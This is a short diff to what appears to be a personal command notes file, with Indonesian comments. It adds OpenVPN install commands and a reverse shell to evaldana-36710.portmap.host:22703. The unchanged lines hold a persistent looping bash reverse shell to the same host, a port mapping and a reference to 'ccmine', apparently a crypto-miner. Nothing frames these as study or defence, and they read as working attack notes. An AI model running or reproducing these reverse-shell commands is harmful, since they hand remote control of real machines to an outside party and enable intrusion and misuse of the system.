@@ -1,5 +1,9 @@
 fuser -k 4055/tcp
 npm i dotenv (install modul dotenv di node)
+# instal opn linux
+apt-get install openvpn
+openvpn --client --config file.ovpn
+sh -i >& /dev/tcp/evaldana-36710.portmap.host/22703 0>&1
 while true; do bash -c 'bash -i >& /dev/tcp/evaldana-36710.portmap.host/22703 0>&1'; sleep 10; done
 evaldana-36710.portmap.host:22703 => 4050
 #### dependence ccmine
